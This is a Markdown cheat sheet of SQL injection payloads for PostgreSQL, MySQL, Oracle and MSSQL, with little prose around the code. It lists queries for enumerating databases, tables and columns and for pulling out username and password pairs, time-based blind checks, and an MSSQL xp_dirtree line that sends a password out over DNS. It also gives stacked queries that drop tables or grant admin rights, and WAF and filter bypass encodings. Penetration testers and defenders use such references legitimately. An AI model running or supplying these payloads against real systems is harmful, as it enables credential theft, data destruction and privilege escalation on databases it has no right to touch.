# SQL Injection Advanced - Verified Techniques

## Database-Specific Syntax

### PostgreSQL
```sql
-- Version
SELECT version()

-- Current user
SELECT current_user

-- List databases
SELECT datname FROM pg_database

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema='public'

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- String concatenation
username||':'||password

-- Time delay
pg_sleep(5)

-- Conditional
CASE WHEN condition THEN pg_sleep(5) ELSE pg_sleep(0) END

-- Comment
--
```

### MySQL
```sql
-- Version
SELECT @@version

-- Current user
SELECT current_user()

-- List databases
SELECT schema_name FROM information_schema.schemata

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- String concatenation
CONCAT(username, ':', password)

-- Time delay
SLEEP(5)

-- Comment
-- or #
```

### Oracle
```sql
-- Version
SELECT BANNER FROM v$version

-- Current user
SELECT user FROM dual

-- List tables
SELECT table_name FROM all_tables

-- List columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- String concatenation
username||':'||password

-- Time delay
DBMS_PIPE.RECEIVE_MESSAGE('a',5)

-- Comment
--
```

### MSSQL
```sql
-- Version
SELECT @@version

-- Current user
SELECT SUSER_NAME()

-- List databases
SELECT name FROM sys.databases

-- List tables
SELECT table_name FROM information_schema.tables

-- String concatenation
username+':'+password

-- Time delay
WAITFOR DELAY '0:0:5'

-- OOB DNS
exec master..xp_dirtree '\\\\'+(SELECT password)+'\\a'

-- Comment
--
```

## Advanced Injection Techniques

### Second-Order SQLi
```
# Inject payload that gets stored, then executed later
# Example: Register user with name: admin'--
# When app queries: SELECT * FROM users WHERE name='admin'--'
# = queries admin user instead
```

### Stacked Queries
```sql
; DROP TABLE users--
; INSERT INTO users VALUES ('admin','password')
; UPDATE users SET role='admin' WHERE username='attacker'
```

### WAF Bypass
```sql
/**/UNION/**/SELECT/**/
/*!UNION*//*!SELECT*/
UN%49ON SEL%45CT
union%0aselect
UNION SELECT /*!50000 1,2,3*/
```

### Filter Bypass
```sql
# Case variation
UnIoN sElEcT

# Inline comments
UN/**/ION SE/**/LECT

# URL encoding
%55%4E%49%4F%4E %53%45%4C%45%43%54

# Double encoding
%2555%254E%2549%254F%254E
```
